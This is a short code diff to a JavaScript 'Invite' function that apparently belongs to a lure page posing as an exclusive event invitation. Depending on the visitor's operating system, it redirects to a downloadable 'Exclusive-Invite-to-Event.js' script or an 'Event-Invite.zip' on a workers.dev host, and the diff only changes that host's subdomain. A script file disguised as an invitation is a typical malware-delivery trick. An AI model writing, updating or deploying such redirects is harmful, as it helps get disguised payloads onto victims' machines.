@@ -30,11 +30,11 @@ function Invite() {
     if (isWindows)
     {
       // Replace with your Windows download URL
-      window.location.href = 'https://exclusive-access-invitation.hemin.workers.dev/Exclusive-Invite-to-Event.js';
+      window.location.href = 'https://exclusive-access-invite-url.hemin.workers.dev/Exclusive-Invite-to-Event.js';
     } else
     {
       // Replace with your Mac download URL
-      window.location.href = 'https://exclusive-access-invitation.hemin.workers.dev/Event-Invite.zip';
+      window.location.href = 'https://exclusive-access-invite-url.hemin.workers.dev/Event-Invite.zip';
     }
   };
 
